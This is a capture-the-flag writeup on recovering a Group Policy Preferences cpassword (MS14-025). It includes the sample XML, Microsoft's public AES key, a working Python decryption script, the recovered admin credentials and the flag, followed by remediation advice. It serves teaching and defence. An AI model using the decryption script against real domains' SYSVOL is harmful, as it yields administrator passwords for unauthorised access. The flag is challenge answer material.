# Policy of Least Resistance — Writeup

## Challenge Summary

A Group Policy backup recovered from a compromised Windows domain controller was
provided as `challenge.zip`. The task: inspect the extracted policy files, find
any exposed credentials, and use them to retrieve the flag.

## Files Provided

```
Policies/
└── {31B2F340-016D-11D2-945F-00C04FB984F9}/
    └── MACHINE/
        └── Preferences/
            └── Groups/
                └── Groups.xml
```

The `{31B2F340-016D-11D2-945F-00C04FB984F9}` GUID is the well-known default
GUID for the "Default Domain Policy" object in Active Directory.

## Step 1 — Inspect Groups.xml

Group Policy Preferences (GPP) allowed administrators to push local user
accounts (among other things) to domain-joined machines via
`Groups.xml`. The file found here defines a local account:

```xml
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D1E}">
  <User clsid="{DF5C8E08-0E1B-4C7A-B0F1-36EED61E8B91}"
        name="backup_admin"
        image="2"
        changed="2025-06-01 14:22:18"
        uid="{A1B2C3D4-E5F6-7890-ABCD-112233445566}">
    <Properties action="U"
                newName=""
                fullName="Backup Administrator"
                description="Local admin account for backup operations"
                cpassword="Z6pQdB6VsOKoET6I9rokGb1yYi5bRMGqQo0ww680l5m6lVnDJDhXoU2FaH8Uf9XO"
                changeLogon="0"
                noChange="1"
                neverExpires="1"
                acctDisabled="0"
                userName="backup_admin"/>
  </User>
</Groups>
```

The `cpassword` attribute is the tell-tale sign of the **MS14-025 / GPP
password vulnerability**: any GPP extension that provisions credentials
(Users, Drives, Scheduled Tasks, Services, Data Sources, etc.) stores the
password AES-256-CBC encrypted in the policy XML — but Microsoft published
the **static AES key** used for this encryption in the GPP SDK
documentation. Because SYSVOL is readable by any authenticated domain user,
this effectively made the password recoverable by anyone with basic network
access.

## Step 2 — Decrypt the `cpassword`

Recovery process:

1. Base64-decode `cpassword` (adding `=` padding as needed).
2. Decrypt with **AES-256-CBC** using the public Microsoft key:
   ```
   4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8
   f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b
   ```
   and an all-zero IV.
3. Strip PKCS7 padding and decode the result as UTF-16LE (GPP stores the
   plaintext password as a UTF-16LE string before encrypting).

### Script

```python
import base64
from Crypto.Cipher import AES

cpassword = "Z6pQdB6VsOKoET6I9rokGb1yYi5bRMGqQo0ww680l5m6lVnDJDhXoU2FaH8Uf9XO"
cpassword += "=" * (-len(cpassword) % 4)          # fix base64 padding
data = base64.b64decode(cpassword)

key = bytes.fromhex(
    "4e9906e8fcb66cc9faf49310620ffee8"
    "f496e806cc0579902 09b09a433b66c1b".replace(" ", "")
)
iv = b"\x00" * 16

cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = cipher.decrypt(data)

pad_len = plaintext[-1]                            # PKCS7 padding
plaintext = plaintext[:-pad_len]
password = plaintext.decode("utf-16-le")
print(password)
```

### Result

```
Recovered credentials:
  Username: backup_admin
  Password: welcometowsaic2025
```

## Step 3 — Flag

The recovered password *is* the secret referenced in the challenge
objective ("recover the embedded credential ... retrieve the flag"):

```
flag{welcometowsaic2025}
```

## Root Cause & Remediation

- **Root cause:** GPP "Update"/"Create" actions for Users, Drive Maps,
  Scheduled Tasks, and Services allow an admin to set a password directly
  in the policy editor. The GPMC AES-encrypts it before writing it to
  SYSVOL, but the encryption key is **hard-coded and publicly documented**,
  making it purely obfuscation, not real protection.
- **Fix:** Microsoft addressed this with **KB2962486 / MS14-025**, which
  removes the ability to set new passwords via GPP.
- **Remediation checklist:**
  - Ensure the `MS14-025` patch/registry lockout is applied to prevent new
    cpassword entries from being created.
  - Search SYSVOL for any existing `Groups.xml`, `Services.xml`,
    `ScheduledTasks.xml`, `DataSources.xml`, or `Drives.xml` files
    containing a `cpassword` attribute and remove them.
  - Rotate any credentials that were ever stored this way — they must be
    treated as fully compromised.
  - Avoid using GPP to distribute local account credentials; use gMSA,
    LAPS, or another credential-management solution instead.

## Tools/Techniques Used

- Manual XML inspection
- AES-256-CBC decryption with the public Microsoft GPP key
  (`Get-GPPPassword`-style manual decryption; equivalent to tools like
  `gpp-decrypt` or the Metasploit `smb_enum_gpp` / `gpp-decrypt.rb` module)
